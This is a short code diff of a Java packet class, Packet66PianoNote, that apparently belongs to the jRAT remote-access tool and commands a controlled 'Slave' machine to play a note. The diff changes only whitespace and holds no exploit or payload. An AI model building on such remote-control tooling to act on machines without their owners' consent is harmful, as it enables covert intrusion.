@@ -4,9 +4,8 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet66PianoNote extends AbstractOutgoingPacket {
-	
+
 	private int note;
 	private boolean buzz;
 
@@ -20,6 +19,7 @@ public class Packet66PianoNote extends AbstractOutgoingPacket {
 		dos.writeInt(note);
 		dos.writeBoolean(buzz);
 	}
+
 	@Override
 	public byte getPacketId() {
 		return 66;
